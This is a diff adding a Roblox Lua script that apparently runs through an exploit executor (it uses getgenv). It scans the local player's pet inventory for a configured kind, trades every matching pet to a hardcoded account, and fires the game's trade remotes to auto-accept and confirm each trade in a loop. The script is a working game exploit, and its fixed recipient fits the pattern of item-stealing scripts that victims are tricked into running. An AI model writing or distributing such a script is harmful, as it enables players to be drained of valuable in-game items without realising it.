@@ -1,0 +1,48 @@
+local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+local Pets = {}
+getgenv().Config = {
+    ["Nickname"] = "SkvadeAccount",
+    ["Pet_kind"] = "winter_2024_frostclaw",
+    ["Pet_unique"] = ""
+}
+
+while wait(1) do
+    pcall(function()
+        print(123)
+        for i, petData in pairs(playerData.inventory.pets) do
+            if petData.kind == getgenv().Config["Pet_kind"] then
+                table.insert(Pets, petData.unique)
+            end
+        end
+        
+        if #Pets ~= 0 then
+            print(2344)
+            local args1 = {
+                [1] = game:GetService("Players"):WaitForChild(getgenv().Config["Nickname"])
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args1))
+            local TradeFrame = game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame
+            repeat wait(1) until TradeFrame.Visible == true
+            
+            for num, i in pairs(Pets) do
+                local args = {
+                    [1] = i
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
+            end
+            
+            repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Accept.Face.Colors.Base.ImageColor3 == Color3.fromRGB(74,198,85)
+            game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
+            
+            repeat wait(1) until game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.ConfirmationFrame.Visible == true
+            game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()
+            
+            table.clear(Pets)
+            repeat wait(1) until TradeFrame.Visible == false
+        else
+            print('no have pets')
+            task.wait(99999999999999)
+        end
+    end)
+end
